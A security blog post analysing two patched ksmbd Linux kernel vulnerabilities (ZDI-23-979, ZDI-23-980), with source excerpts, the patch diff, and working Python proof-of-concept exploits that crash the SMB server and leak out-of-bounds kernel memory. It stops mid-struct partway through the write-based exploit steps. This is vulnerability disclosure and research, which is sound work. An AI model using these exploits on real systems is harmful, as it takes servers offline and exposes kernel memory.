<!DOCTYPE html>
<html lang="en" class="dark-mode">
<head>

    <title>Unleashing ksmbd: remote exploitation of the Linux kernel (ZDI-23-979, ZDI-23-980)</title>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="HandheldFriendly" content="True" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    
    <link rel="preload" as="style" href="/assets/built/screen.css?v=50a5a782cf" />
    <link rel="preload" as="script" href="/assets/built/casper.js?v=50a5a782cf" />

    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css?v=50a5a782cf" />

    <link rel="icon" href="https://pwning.tech/content/images/size/w256h256/format/png/2024/01/favicon-1.webp" type="image/png">
    <link rel="canonical" href="https://pwning.tech/ksmbd/">
    <meta name="referrer" content="no-referrer-when-downgrade">
    
    <meta property="og:site_name" content="Pwning Tech">
    <meta property="og:type" content="article">
    <meta property="og:title" content="Unleashing ksmbd: remote exploitation of the Linux kernel (ZDI-23-979, ZDI-23-980)">
    <meta property="og:description" content="December 22nd 2022: it&#x27;s Christmas Thursday, one of the last workdays before the Christmas vacation starts. Whilst everyone was looking forward to opening presents from friends and family, the Zero Day Initiative decided to give the IT community a present as well: immense stress in the form of ZDI-22-1690, an">
    <meta property="og:url" content="https://pwning.tech/ksmbd/">
    <meta property="og:image" content="https://pwning.tech/content/images/2024/01/publication-cover-casper-1k.webp">
    <meta property="article:published_time" content="2023-08-04T18:57:34.000Z">
    <meta property="article:modified_time" content="2024-01-02T13:28:13.000Z">
    <meta property="article:tag" content="Real World">
    <meta property="article:tag" content="Heap Memory">
    <meta property="article:tag" content="Linux Kernel">
    <meta property="article:tag" content="Binary Exploitation">
    <meta property="article:tag" content="Ksmbd">
    
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Unleashing ksmbd: remote exploitation of the Linux kernel (ZDI-23-979, ZDI-23-980)">
    <meta name="twitter:description" content="December 22nd 2022: it&#x27;s Christmas Thursday, one of the last workdays before the Christmas vacation starts. Whilst everyone was looking forward to opening presents from friends and family, the Zero Day Initiative decided to give the IT community a present as well: immense stress in the form of ZDI-22-1690, an">
    <meta name="twitter:url" content="https://pwning.tech/ksmbd/">
    <meta name="twitter:image" content="https://pwning.tech/content/images/2023/12/logo_twitter_card.webp">
    <meta name="twitter:label1" content="Written by">
    <meta name="twitter:data1" content="notselwyn">
    <meta name="twitter:label2" content="Filed under">
    <meta name="twitter:data2" content="Real World, Heap Memory, Linux Kernel, Binary Exploitation, Ksmbd">
    <meta name="twitter:site" content="@notselwyn">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="482">
    
    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Article",
    "publisher": {
        "@type": "Organization",
        "name": "Pwning Tech",
        "url": "https://pwning.tech/",
        "logo": {
            "@type": "ImageObject",
            "url": "https://pwning.tech/content/images/2024/01/logo_transparent.svg"
        }
    },
    "author": {
        "@type": "Person",
        "name": "notselwyn",
        "url": "https://pwning.tech/author/notselwyn-2/",
        "sameAs": []
    },
    "headline": "Unleashing ksmbd: remote exploitation of the Linux kernel (ZDI-23-979, ZDI-23-980)",
    "url": "https://pwning.tech/ksmbd/",
    "datePublished": "2023-08-04T18:57:34.000Z",
    "dateModified": "2024-01-02T13:28:13.000Z",
    "keywords": "Real World, Heap Memory, Linux Kernel, Binary Exploitation, Ksmbd",
    "description": "December 22nd 2022: it&#x27;s Christmas Thursday, one of the last workdays before the Christmas vacation starts. Whilst everyone was looking forward to opening presents from friends and family, the Zero Day Initiative decided to give the IT community a present as well: immense stress in the form of ZDI-22-1690, an unauthenticated RCE vulnerability in the Linux kernel&#x27;s ksmbd subsystem.\n\nThis vulnerability showed me the way to a buggy subsystem of the Linux kernel: ksmbd. Ksmbd stands for Kernel SMB D",
    "mainEntityOfPage": "https://pwning.tech/ksmbd/"
}
    </script>

    <meta name="generator" content="Ghost 5.75">
    <link rel="alternate" type="application/rss+xml" title="Pwning Tech" href="https://pwning.tech/rss/">
    
    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/sodo-search.min.js" data-key="edf92d97a2ffbb07659fa25625" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/main.css" data-sodo-search="https://pwning.tech/" crossorigin="anonymous"></script>
    
    <link href="https://pwning.tech/webmentions/receive/" rel="webmention">
    <script defer src="/public/cards.min.js?v=50a5a782cf"></script>
    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=50a5a782cf">
    <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://cdnjs.cloudflare.com/ajax/libs/prism-themes/1.9.0/prism-vsc-dark-plus.min.css" integrity="sha512-ML8rkwYTFNcblPFx+VLgFIT2boa6f8DDP6p6go4+FT0/mJ8DCbCgi6S0UdjtzB3hKCr1zhU+YVB0AHhIloZP8Q==" crossorigin="anonymous" referrerpolicy="no-referrer" />
<link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-highlight/prism-line-highlight.min.css" integrity="sha512-nXlJLUeqPMp1Q3+Bd8Qds8tXeRVQscMscwysJm821C++9w6WtsFbJjPenZ8cQVMXyqSAismveQJc0C1splFDCA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
<link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/brands.min.css" integrity="sha512-W/zrbCncQnky/EzL+/AYwTtosvrM+YG/V6piQLSe2HuKS6cmbw89kjYkp3tWFn1dkWV7L1ruvJyKbLz73Vlgfg==" crossorigin="anonymous" referrerpolicy="no-referrer" />

<style>
    .gh-head-menu .nav-twitter a,
    .gh-head-menu .nav-github a {
        font-size: 0 !important;
    }

    .gh-head-menu .nav-twitter a::before,
    .gh-head-menu .nav-github a::before {
        font-family: "Font Awesome 6 Brands";
        display: inline-block;
        font-size: 20px;
        font-style: normal;
        font-weight: normal;
        font-variant: normal;
        text-rendering: auto;
        font-smoothing: antialiased;
    }

    .gh-head-menu .nav-twitter a::before {content: "\f099"}
    .gh-head-menu .nav-github a::before {content: "\f09b"}
</style>

<!-- Tocbot Stylesheet -->
<link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.12.3/tocbot.css" />

<!-- Tocbot Inline CSS (Specific Adjustments for the Casper Theme) -->
<style>
   
.gh-content {
    position: relative;
 }

.gh-toc > .toc-list {
    position: relative;
    overflow: hidden;
    padding-left: 10px;
}
    
.toc-list-item a {
    text-decoration: none;
}
    
.toc-list-item {  
    list-style: none !important;
}
    
.toc-list {    
    margin-left: 20px;
}

@media (min-width: 1300px) {
     .gh-sidebar {
        position: absolute; 
        top: 0;
        bottom: 0;
        margin-top: 4vmin;
		margin-left: 20px;
        grid-column: 1 / 3;
    }
   
    .gh-toc {
        position: sticky;
        top: 4vmin;
    }
    
    /* compensate ToC margin (required for scrolling) */
    .article-header {
     	padding-bottom: 10px;   
    }
}

.gh-toc .is-active-link::before {
    background-color: var(--ghost-accent-color);
}
</style>

<style>
	/* fix cover image of blogpost (make it inline with the text) */
	.gh-canvas .article-image {
     	grid-column: 3/3;   
    }
</style>

<style>
  /* set font of entire website */
  body { font-family: @import url(https://fonts.bunny.net/css?family=noto-sans:400,600), sans-serif; }
  h1 h2 h3 h4 h5 h6 { font-family: @import url(https://fonts.bunny.net/css?family=noto-sans:600), sans-serif; }
</style><style>:root {--ghost-accent-color: #e01b24;}</style>

</head>
<body class="post-template tag-real-world tag-heap-memory tag-linux-kernel tag-binexp tag-hash-import-2023-09-17-13-10 tag-ksmbd tag-hash-import-2023-12-29-22-15 is-head-left-logo has-sans-body has-cover">
<div class="viewport">

    <header id="gh-head" class="gh-head outer">
        <div class="gh-head-inner inner">
            <div class="gh-head-brand">
                <a class="gh-head-logo" href="https://pwning.tech">
                        <img src="https://pwning.tech/content/images/2024/01/logo_transparent.svg" alt="Pwning Tech">
                </a>
                <button class="gh-search gh-icon-btn" aria-label="Search this site" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
                <button class="gh-burger"></button>
            </div>

            <nav class="gh-head-menu">
                <ul class="nav">
    <li class="nav-home"><a href="https://pwning.tech/">Home</a></li>
    <li class="nav-about-me"><a href="https://pwning.tech/about/">About Me</a></li>
    <li class="nav-twitter"><a href="https://twitter.com/notselwyn/">Twitter</a></li>
    <li class="nav-github"><a href="https://github.com/notselwyn/">Github</a></li>
</ul>

            </nav>

            <div class="gh-head-actions">
                        <button class="gh-search gh-icon-btn" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
            </div>
        </div>
    </header>

    <div class="site-content">
        



<main id="site-main" class="site-main">
<article class="article post tag-real-world tag-heap-memory tag-linux-kernel tag-binexp tag-hash-import-2023-09-17-13-10 tag-ksmbd tag-hash-import-2023-12-29-22-15 featured no-image ">

    <header class="article-header gh-canvas">

        <div class="article-tag post-card-tags">
                <span class="post-card-primary-tag">
                    <a href="/tag/real-world/">Real World</a>
                </span>
                <span class="post-card-featured"><svg width="16" height="17" viewBox="0 0 16 17" fill="none" xmlns="http://www.w3.org/2000/svg">
    <path d="M4.49365 4.58752C3.53115 6.03752 2.74365 7.70002 2.74365 9.25002C2.74365 10.6424 3.29678 11.9778 4.28134 12.9623C5.26591 13.9469 6.60127 14.5 7.99365 14.5C9.38604 14.5 10.7214 13.9469 11.706 12.9623C12.6905 11.9778 13.2437 10.6424 13.2437 9.25002C13.2437 6.00002 10.9937 3.50002 9.16865 1.68127L6.99365 6.25002L4.49365 4.58752Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
</svg> Featured</span>
        </div>

        <h1 class="article-title">Unleashing ksmbd: remote exploitation of the Linux kernel (ZDI-23-979, ZDI-23-980)</h1>


        <div class="article-byline">
        <section class="article-byline-content">

            <ul class="author-list">
                <li class="author-list-item">
                    <a href="/author/notselwyn-2/" class="author-avatar author-profile-image"><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd"><path d="M3.513 18.998C4.749 15.504 8.082 13 12 13s7.251 2.504 8.487 5.998C18.47 21.442 15.417 23 12 23s-6.47-1.558-8.487-4.002zM12 12c2.21 0 4-2.79 4-5s-1.79-4-4-4-4 1.79-4 4 1.79 5 4 5z" fill="#FFF"/></g></svg>
</a>
                </li>
            </ul>

            <div class="article-byline-meta">
                <h4 class="author-name"><a href="/author/notselwyn-2/">notselwyn</a></h4>
                <div class="byline-meta-content">
                    <time class="byline-meta-date" datetime="2023-08-04">Aug 4, 2023</time>
                        <span class="byline-reading-time"><span class="bull">&bull;</span> 10 min read</span>
                </div>
            </div>

        </section>
        </div>


    </header>

    <section class="gh-content gh-canvas">
        <p>December 22nd 2022: it's Christmas Thursday, one of the last workdays before the Christmas vacation starts. Whilst everyone was looking forward to opening presents from friends and family, the Zero Day Initiative decided to give the IT community a present as well: immense stress in the form of <a href="https://www.zerodayinitiative.com/advisories/ZDI-23-1690/"><code>ZDI-22-1690</code></a>, an unauthenticated RCE vulnerability in the Linux kernel's ksmbd subsystem.</p><p>This vulnerability showed me the way to a buggy subsystem of the Linux kernel: ksmbd. Ksmbd stands for Kernel SMB Daemon which acts as an SMB server (which you may recognize from Windows) in the kernel. SMB is known in the community for the unnecessary complexity and it's resulting vulnerabilities. Imagine the <a href="https://lwn.net/ml/linux-kernel/202109221850.003A16EC1@keescook/">reaction</a> of the Linux developer community when ksmbd was being introduced in the kernel.</p><p>I wanted to learn more about SMB and the ksmbd subsystem so I decided to do vulnerability research in this subsystem, with results. In this write-up I will present the exploits and technical analyses behind <a href="https://www.zerodayinitiative.com/advisories/ZDI-23-979/"><code>ZDI-23-979</code></a> and <a href="https://www.zerodayinitiative.com/advisories/ZDI-23-980/"><code>ZDI-23-980</code></a>: network-based unauthenticated Denial-of-Service and network-based (un)authenticated Out-of-Bounds read 64KiB.</p><h2 id="table-of-content">Table of Content</h2><ol><li>An overview of SMB</li><li><code>ZDI-23-979</code> analysis and proof-of-concept</li><li><code>ZDI-23-980</code> analysis and proof-of-concept</li><li>Conclusion</li></ol><h2 id="an-overview-of-smb">An overview of SMB</h2><p>Server Message Block is a file transfer protocol widely used by Windows OS where it can be used to access a NAS or another computer over a network. The most important features of SMB are file reads and writes, accessing directory information and doing authentication. Since the Windows OS tries to integrate SMB, SMB also has many ways of doing authentication for the Windows ecosystem: NTLMSSP, Kerberos 5, Microsoft Kerberos 5, and Kerberos 5 user-to-user (U2U). Ofcourse, the kernel also supports normal authentication like regular passwords.</p><p>To prevent extensive resource usage (like disk storage and RAM), SMB has a credit system where each command subtracts credits from the session. If the credits reach 0, the session cannot issue more commands.</p><p><strong>N.B. A packet, request and command are different things. The same goes for a session and a connection.</strong></p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://pwning.tech/content/images/2024/01/ksmbd_chained_request.drawio.svg" class="kg-image" alt="" loading="lazy" width="2203" height="588"><figcaption><span style="white-space: pre-wrap;">An overview of the definitions of an chained SMB request packet.</span></figcaption></figure><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://pwning.tech/content/images/2024/01/ksmbd_session.drawio.svg" class="kg-image" alt="" loading="lazy" width="1123" height="498"><figcaption><span style="white-space: pre-wrap;">An overview of the definitions of an SMB session and connection.</span></figcaption></figure><h2 id="zdi-23-979-null-pointer-dereference-denial-of-service">ZDI-23-979: NULL Pointer Dereference Denial-of-Service</h2><p>ZDI-23-979 is an network-based unauthenticated NULL pointer dereference vulnerability resulting from a logic bug in the session handling of chained SMB request packets. The ksmbd subsystem only handles the session for the first request in the packet, which makes a second request in the packet use the same session instance as well. However, when the first request does not use a session, the second request does consequently not use a session either, even when it is required. </p><p>This could hypothetically result in an auth bypass since it skips the session/auth checks, but instead leads to an NULL pointer dereference since it tries to access properties of the request session.</p><p>Let's dive in the function <a href="https://elixir.bootlin.com/linux/v6.3.9/source/fs/ksmbd/server.c#L161"><code>__handle_ksmbd_work</code></a>of <code>v6.3.9</code>, the last vulnerable kernel release. This function gets called for every packet from a connection. As you can see, the function does call <code>__process_request</code> for every request in the packet, but only checks the session for the first request in the packet using <code>conn-&gt;ops-&gt;check_user_session(work)</code> (explanation below).</p><figure class="kg-card kg-code-card"><pre><code class="language-c">static void __handle_ksmbd_work(struct ksmbd_work *work,
				struct ksmbd_conn *conn)
{
	u16 command = 0;
	int rc;

	// [snip] (initialize buffers) 

	if (conn-&gt;ops-&gt;check_user_session) {
		rc = conn-&gt;ops-&gt;check_user_session(work);

		// if rc != 0 goto send (auth failed)
		if (rc &lt; 0) {
			command = conn-&gt;ops-&gt;get_cmd_val(work);
			conn-&gt;ops-&gt;set_rsp_status(work,
					STATUS_USER_SESSION_DELETED);
			goto send;
		} else if (rc &gt; 0) {
			rc = conn-&gt;ops-&gt;get_ksmbd_tcon(work);
			if (rc &lt; 0) {
				conn-&gt;ops-&gt;set_rsp_status(work,
					STATUS_NETWORK_NAME_DELETED);
				goto send;
			}
		}
	}

	do {
		rc = __process_request(work, conn, &amp;command);
		if (rc == SERVER_HANDLER_ABORT)
			break;

	    // [snip] (set SMB credits)
	} while (is_chained_smb2_message(work));

	if (work-&gt;send_no_response)
		return;

send:
	// [snip] (send response)
}</code></pre><figcaption><p><code spellcheck="false" style="white-space: pre-wrap;"><span>__handle_ksmbd_work</span></code><span style="white-space: pre-wrap;"> - session handling and request processing per packet.</span></p></figcaption></figure><p>The function <code>conn-&gt;ops-&gt;</code><a href="https://elixir.bootlin.com/linux/v6.3.9/source/fs/ksmbd/smb2pdu.c#L543"><code>check_user_session</code></a><code>(work)</code> checks if the pending request requires a session, and if it does it will check <code>req_hdr-&gt;SessionId</code> for existing sessions whereby <code>req_hdr-&gt;SessionId</code> is randomly generated during SMB login. If the session check succeeds, then <code>work-&gt;sess = ksmbd_session_lookup_all(conn, sess_id)</code> or if the request does not require a session, then <code>work-&gt;sess = NULL</code>.</p><figure class="kg-card kg-code-card"><pre><code class="language-c">int smb2_check_user_session(struct ksmbd_work *work)
{
	struct smb2_hdr *req_hdr = smb2_get_msg(work-&gt;request_buf);
	struct ksmbd_conn *conn = work-&gt;conn;
	unsigned int cmd = conn-&gt;ops-&gt;get_cmd_val(work);
	unsigned long long sess_id;

	/*
	 * SMB2_ECHO, SMB2_NEGOTIATE, SMB2_SESSION_SETUP command do not
	 * require a session id, so no need to validate user session's for
	 * these commands.
	 */
	if (cmd == SMB2_ECHO_HE || cmd == SMB2_NEGOTIATE_HE ||
	    cmd == SMB2_SESSION_SETUP_HE)
		return 0;

	// [snip] (check conn quality)

	sess_id = le64_to_cpu(req_hdr-&gt;SessionId);

	// [snip] (chained request logic that was unused)

	/* Check for validity of user session */
	work-&gt;sess = ksmbd_session_lookup_all(conn, sess_id);
	if (work-&gt;sess)
		return 1;
	
    // [snip] (invalid session handling)
}</code></pre><figcaption><p><code spellcheck="false" style="white-space: pre-wrap;"><span>smb2_check_user_session</span></code><span style="white-space: pre-wrap;"> - codeblock of SMB validation checks.</span></p></figcaption></figure><p>Obviously, when the first command is i.e. <code>SMB2_ECHO_HE</code> and the second command is i.e. <code>SMB2_WRITE</code>, the <code>work-&gt;sess</code> variable will be <code>NULL</code> in <code>smb2_write()</code>. This will cause a dereference like <code>work-&gt;sess-&gt;x</code> and hence a NULL pointer derefence. Since NULL pointer dereferences panic the kernel thread, the SMB server will be taken offline while the rest of the kernel remains online. The proof-of-concept exploit for this vulnerability is as follows:</p><figure class="kg-card kg-code-card"><pre><code class="language-py">#!/usr/bin/env python3

from impacket import smb3, nmb
from pwn import p64, p32, p16, p8


def main():
    print("[*] connecting to SMB server (no login)...")

    try:
        conn = smb3.SMB3("127.0.0.1", "127.0.0.1", sess_port=445, timeout=3)
    except nmb.NetBIOSTimeout:
        print("[!] SMB server is already offline (connection timeout)")
        return

    # generate innocent SMB_ECHO request
    request_echo = smb3.SMB3Packet()
    request_echo['Command'] = smb3.SMB2_ECHO
    request_echo["Data"] = p16(4) + p16(0)
    request_echo["NextCommand"] = 64+4  # set NextCommand to indicate request chaining

    # generate innocent SMB_WRITE request
    request_write = smb3.SMB3Packet()
    request_write['Command'] = smb3.SMB2_WRITE
    request_write["Data"] = p16(49) + p16(0) + p32(0) + p64(0) + p64(0) + p64(0) + p32(0) + p32(0) + p16(0) + p16(0) + p32(0) + p8(0)
    request_write["TreeID"] = 0

    # chain SMB_WRITE to SMB_ECHO
    request_echo["Data"] += request_write.getData()

    print('[*] sending DoS packet...')
    conn.sendSMB(request_echo)

    print("[*] probing server health...")

    try:
        smb3.SMB3("127.0.0.1", "127.0.0.1", sess_port=445, timeout=3)
        print("[!] exploit failed - server remains online")
    except nmb.NetBIOSTimeout:
        print("[+] exploit succeeded - server is now offline")


if __name__ == "__main__":
    main()
</code></pre><figcaption><p><span style="white-space: pre-wrap;">Proof-of-Concept (PoC) exploit for ZDI-23-979 written in Python code.&nbsp;</span></p></figcaption></figure><p>The most important part of the <a href="https://lore.kernel.org/all/20230626180806.105257976@linuxfoundation.org/">patch</a> is moving the session check into the chained request loop, which results into the session check being executed for each chained request in the packet, instead of just the first one.</p><figure class="kg-card kg-code-card"><pre><code class="language-diff">+++ b/fs/ksmbd/server.c
@@ -184,24 +184,31 @@ static void __handle_ksmbd_work(struct k
 		goto send;
 	}
 
-	if (conn-&gt;ops-&gt;check_user_session) {
-		rc = conn-&gt;ops-&gt;check_user_session(work);
-		if (rc &lt; 0) {
-			command = conn-&gt;ops-&gt;get_cmd_val(work);
-			conn-&gt;ops-&gt;set_rsp_status(work,
-					STATUS_USER_SESSION_DELETED);
-			goto send;
-		} else if (rc &gt; 0) {
-			rc = conn-&gt;ops-&gt;get_ksmbd_tcon(work);
+	do {
+		if (conn-&gt;ops-&gt;check_user_session) {
+			rc = conn-&gt;ops-&gt;check_user_session(work);
 			if (rc &lt; 0) {
-				conn-&gt;ops-&gt;set_rsp_status(work,
-					STATUS_NETWORK_NAME_DELETED);
+				if (rc == -EINVAL)
+					conn-&gt;ops-&gt;set_rsp_status(work,
+						STATUS_INVALID_PARAMETER);
+				else
+					conn-&gt;ops-&gt;set_rsp_status(work,
+						STATUS_USER_SESSION_DELETED);
 				goto send;
+			} else if (rc &gt; 0) {
+				rc = conn-&gt;ops-&gt;get_ksmbd_tcon(work);
+				if (rc &lt; 0) {
+					if (rc == -EINVAL)
+						conn-&gt;ops-&gt;set_rsp_status(work,
+							STATUS_INVALID_PARAMETER);
+					else
+						conn-&gt;ops-&gt;set_rsp_status(work,
+							STATUS_NETWORK_NAME_DELETED);
+					goto send;
+				}
 			}
 		}
-	}
 
-	do {
 		rc = __process_request(work, conn, &amp;command);
 		if (rc == SERVER_HANDLER_ABORT)
 			break;
--- a/fs/ksmbd/smb2pdu.c</code></pre><figcaption><p><span style="white-space: pre-wrap;">The official patch for </span><code spellcheck="false" style="white-space: pre-wrap;"><span>ZDI-23-979</span></code><span style="white-space: pre-wrap;">.</span></p></figcaption></figure><h2 id="zdi-23-980-out-of-bounds-read-information-disclosure">ZDI-23-980: Out-Of-Bounds Read Information Disclosure</h2><p>ZDI-23-980 is a network-based (un)authenticated out-of-bounds read in the ksmbd subsystem of the Linux kernel, which allows a user to read up to 65536 consequent bytes from kernel memory. This issue results from an buffer over-read, much like the Heartbleed vulnerability in SSL, where the request packet states that the packet content is larger than it's actual size, resulting in the parsing of the packet with a fake size. </p><p>This can be exploited by issueing an SMB_WRITE request with size N to file "dump.bin", whereby the actual request empty is smaller than N. Then, issue an SMB_READ request to download the "dump.bin" file and eventually delete "dump.bin" to remove the exploitation traces.</p><p>When I was researching this vulnerability, I also found an unauthenticated OOB read of 2 bytes using SMB_ECHO, but I figured this was less important than the authenticated OOB read of 65536 bytes due to usability (whether or not this was the right decision is up to debate ;-) ). Hence, the CVE description says it's authenticated. I will also discuss the SMB_ECHO and explain the exploitation behind that path. The 2-byte OOB read consists of issue'ing an SMB_ECHO command with the last 2 bytes of the packet not being filled in. </p><h3 id="the-underlying-issue">The underlying issue</h3><p>The underlying issue leading to the OOB read is improper validation of the SMB request packet parameter <code>smb2_hdr.NextCommand</code> containing the offset to the next command. When <code>NextCommand</code> is set, the SMB server assumes that the current command/request is the size of <code>NextCommand</code>. Hence, when I have a packet of size N, I can set <code>NextCommand</code> to N+2, and it will assume the packet is N+2 bytes long. This can be seen in action in the <code>ksmbd_smb2_check_message</code> and <code>smb2_calc_size</code> functions. The function <code>ksmbd_smb2_check_message</code> does several assertions/validations:</p><figure class="kg-card kg-code-card"><pre><code class="language-C">hdr-&gt;StructureSize == 64
pdu-&gt;StructureSize2 == smb2_req_struct_sizes[command]  // SMB2_WRITE: 49, SMB2_ECHO: 4
hdr-&gt;NextCommand == pdu-&gt;StructureSize2 + hdr-&gt;StructureSize  // SMB_ECHO
hdr-&gt;NextCommand == hdr-&gt;DataOffset + hdr-&gt;Length  // SMB_WRITE</code></pre><figcaption><p><span style="white-space: pre-wrap;">The assertions put onto the packet, for validation.</span></p></figcaption></figure><p>But it does not assert <code>work-&gt;next_smb2_rcv_hdr_off + hdr-&gt;NextCommand &lt;= get_rfc1002_len(work-&gt;request_buf)</code>, which is the official patch.</p><figure class="kg-card kg-code-card"><pre><code class="language-c">static int smb2_get_data_area_len(unsigned int *off, unsigned int *len,
				  struct smb2_hdr *hdr)
{
	int ret = 0;

	*off = 0;
	*len = 0;

	switch (hdr-&gt;Command) {
	// [snip] not reached
	case SMB2_WRITE:
		if (((struct smb2_write_req *)hdr)-&gt;DataOffset ||
		    ((struct smb2_write_req *)hdr)-&gt;Length) {
			*off = max_t(unsigned int,
				     le16_to_cpu(((struct smb2_write_req *)hdr)-&gt;DataOffset),
				     offsetof(struct smb2_write_req, Buffer));
			*len = le32_to_cpu(((struct smb2_write_req *)hdr)-&gt;Length);
			break;
		}

		*off = le16_to_cpu(((struct smb2_write_req *)hdr)-&gt;WriteChannelInfoOffset);
		*len = le16_to_cpu(((struct smb2_write_req *)hdr)-&gt;WriteChannelInfoLength);
		break;
	// [snip] not reached
	default:
		// [snip] not reached
	}

	// [snip] return error if offset &gt; 4096

	return ret;
}

static int smb2_calc_size(void *buf, unsigned int *len)
{
	struct smb2_pdu *pdu = (struct smb2_pdu *)buf;
	struct smb2_hdr *hdr = &amp;pdu-&gt;hdr;
	unsigned int offset; /* the offset from the beginning of SMB to data area */
	unsigned int data_length; /* the length of the variable length data area */
	int ret;

	*len = le16_to_cpu(hdr-&gt;StructureSize);
	*len += le16_to_cpu(pdu-&gt;StructureSize2);

	if (has_smb2_data_area[le16_to_cpu(hdr-&gt;Command)] == false) {
		// SMB_ECHO will reach this
        goto calc_size_exit;
	}

	// SMB_WRITE will reach this
	ret = smb2_get_data_area_len(&amp;offset, &amp;data_length, hdr);
    // [snip] return error if ret &lt; 0

	if (data_length &gt; 0) {
		// [snip] return error when data overlaps with next cmd

		*len = offset + data_length;
	}

calc_size_exit:
	ksmbd_debug(SMB, "SMB2 len %u\n", *len);
	return 0;
}

int ksmbd_smb2_check_message(struct ksmbd_work *work)
{
	struct smb2_pdu *pdu = ksmbd_req_buf_next(work);
	struct smb2_hdr *hdr = &amp;pdu-&gt;hdr;
	int command;
	__u32 clc_len;  /* calculated length */
	__u32 len = get_rfc1002_len(work-&gt;request_buf);

	if (le32_to_cpu(hdr-&gt;NextCommand) &gt; 0)
		len = le32_to_cpu(hdr-&gt;NextCommand);
	else if (work-&gt;next_smb2_rcv_hdr_off)
		len -= work-&gt;next_smb2_rcv_hdr_off;

	// [snip] check flag in header

	if (hdr-&gt;StructureSize != SMB2_HEADER_STRUCTURE_SIZE) {
		// [snip] return error
	}

	command = le16_to_cpu(hdr-&gt;Command);
	// [snip] check if command is valid

	if (smb2_req_struct_sizes[command] != pdu-&gt;StructureSize2) {
		// [snip] return error (with exceptions)
	}

	if (smb2_calc_size(hdr, &amp;clc_len)) {
		// [snip] return error (with exceptions)
	}

	if (len != clc_len) {
		// [snip] return error (with exceptions)
	}

validate_credit:
	// [snip] irrelevant credit check

	return 0;
}</code></pre><figcaption><p><span style="white-space: pre-wrap;">The functions causing the vulnerability.</span></p></figcaption></figure><p>As you can see, for SMB_WRITE we can set an arbitrary packet size by setting  <code>hdr-&gt;Length</code> and <code>hdr-&gt;NextCommand</code> variables to compliment each other. As per SMB_ECHO, we just need to set <code>hdr-&gt;NextCommand</code> to the expected value, without actually filling in <code>smb2_echo_req-&gt;reserved</code>:</p><figure class="kg-card kg-code-card"><pre><code class="language-c">struct smb2_echo_req {
	struct smb2_hdr hdr;
	__le16 StructureSize;	/* Must be 4 */
	__u16  Reserved;
} __packed;</code></pre><figcaption><p><span style="white-space: pre-wrap;">The </span><code spellcheck="false" style="white-space: pre-wrap;"><span>smb2_echo_req</span></code><span style="white-space: pre-wrap;"> struct.</span></p></figcaption></figure><h3 id="exploitation">Exploitation</h3><p>To leak 2 bytes using <code>SMB_ECHO</code>:</p><ol><li>Set <code>smb2_echo_req-&gt;StructureSize = p16(4)</code></li><li>Set <code>smb2_echo_req-&gt;hdr.NextCommand = sizeof(smb2_echo_req-&gt;hdr) + smb2_echo_req-&gt;StructureSize</code></li><li>Send request</li><li>Read echo response, with the last 2 bytes being an OOB read.</li></ol><figure class="kg-card kg-code-card"><pre><code class="language-py">#!/usr/bin/env python3

from impacket import smb3
from pwn import p64, p32, p16, p8


def main():
    print("[*] connecting to SMB server...")
    conn = smb3.SMB3("127.0.0.1", "127.0.0.1", sess_port=445)

    packet = smb3.SMB3Packet()
    packet['Command'] = smb3.SMB2_ECHO
    packet["Data"] = p16(0x4)
    packet["NextCommand"] = 64+4

    print("[*] sending OOB read...")
    conn.sendSMB(packet)

    print("[*] reading response...")
    rsp = conn.recvSMB().rawData
    print(rsp)


if __name__ == "__main__":
    main()</code></pre><figcaption><p><code spellcheck="false" style="white-space: pre-wrap;"><span>ZDI-23-980</span></code><span style="white-space: pre-wrap;"> PoC exploit using </span><code spellcheck="false" style="white-space: pre-wrap;"><span>SMB_ECHO</span></code></p></figcaption></figure><p>For the <code>SMB_WRITE</code> path, here's the struct and the steps:</p><figure class="kg-card kg-code-card"><pre><code class="language-c">struct smb2_write_req {
	struct smb2_hdr hdr;
	__le16 StructureSize; /* Must be 49 */
	__le16 DataOffset; /* offset from start of SMB2 header to write data */
	__le32 Length;
	__le64 Offset;
	__u64  PersistentFileId; /* opaque endianness */
	__u64  VolatileFileId; /* opaque endianness */
	__le32 Channel; /* MBZ unless SMB3.02 or later */
	__le32 RemainingBytes;
	__le16 WriteChannelInfoOffset;
	__le16 WriteChannelInfoLength;
	__le32 Flags;
	__u8   Buffer[];
